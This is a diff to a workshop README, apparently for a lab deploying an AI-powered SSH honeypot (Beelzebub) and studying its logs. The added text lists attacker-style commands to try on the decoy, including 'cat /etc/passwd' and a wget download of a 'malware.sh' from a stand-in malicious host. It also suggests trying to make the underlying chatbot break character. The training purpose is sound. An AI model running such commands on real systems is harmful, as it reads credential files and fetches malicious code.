@@ -36,6 +36,27 @@ Participants will deploy and monitor an AI-powered SSH honeypot (Beelzebub) to d
 Connect to it like
 - $`ssh -p 2222 root@127.0.0.1` - use password "**1234**"
 - Try using any commands like **ls** or **id**
+<img width="659" height="126" alt="image" src="https://github.com/user-attachments/assets/914c1f89-c3d0-412d-bae6-7b9fcee70d9e" />
+
+Everything you see is AI generated, and that's what an attacker would see
+
+Cool, right?
+
+- Try running suspicious commands an attacker would use
+<pre>uname -a
+cat /etc/passwd
+wget http://malicious.example/malware.sh
+id</pre>
+
+Now exit the session to export the logs
+
+- $`cd /opt/beelzebub/`
+- $`docker-compose logs -f`
+- $`docker-compose logs > honeypot.log`
+
+Take your time into analyzing the logs and seeing how they are being built
+
+Try to make ChatGpt break character, this method, like anything else in cybersecurity isn't flawless, but it surely tricks hackers and does its job, **to increase Attack Time**
 
 
 
